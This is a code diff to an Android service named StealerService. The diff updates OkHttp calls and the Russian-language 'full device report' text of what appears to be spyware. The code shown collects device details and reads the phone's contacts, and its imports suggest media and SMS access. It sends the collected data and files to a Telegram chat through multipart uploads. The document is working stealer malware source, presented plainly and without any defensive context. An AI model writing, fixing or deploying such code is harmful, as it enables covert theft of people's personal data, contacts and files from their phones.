@@ -11,7 +11,7 @@ import android.provider.MediaStore
 import android.provider.Telephony
 import okhttp3.OkHttpClient
 import okhttp3.Request
-import okhttp3.MediaType
+import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.MultipartBody
 import okhttp3.RequestBody
 import java.io.File
@@ -34,11 +34,12 @@ class StealerService : Service() {
                 🕵️‍♂️ ПОЛНЫЙ ОТЧЕТ УСТРОЙСТВА
                 ⏰ Время: ${SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
                 
-                📱 Модель: ${android.os.Build.MODEL}
-                🏭 Производитель: ${android.os.Build.MANUFACTURER}
-                🤖 Android: ${android.os.Build.VERSION.RELEASE}
-                🔧 Продукт: ${android.os.Build.PRODUCT}
-                📦 Отпечаток: ${android.os.Build.FINGERPRINT}
+                📱 ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ:
+                Модель: ${android.os.Build.MODEL}
+                Производитель: ${android.os.Build.MANUFACTURER}
+                Android: ${android.os.Build.VERSION.RELEASE}
+                SDK: ${android.os.Build.VERSION.SDK_INT}
+                Продукт: ${android.os.Build.PRODUCT}
                 """.trimIndent()
                 
                 sendToTelegram(deviceInfo)
@@ -49,6 +50,7 @@ class StealerService : Service() {
                     ContactsContract.Contacts.CONTENT_URI,
                     null, null, null, null
                 )
+                
                 cursor?.use {
                     while (it.moveToNext()) {
                         val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
@@ -116,7 +118,7 @@ class StealerService : Service() {
                 .addFormDataPart("chat_id", chatId)
                 .addFormDataPart("caption", caption.take(200))
                 .addFormDataPart("document", file.name, 
-                    RequestBody.create(MediaType.parse("application/octet-stream"), file))
+                    RequestBody.create("application/octet-stream".toMediaType(), file))
                 .build()
 
             val request = Request.Builder()
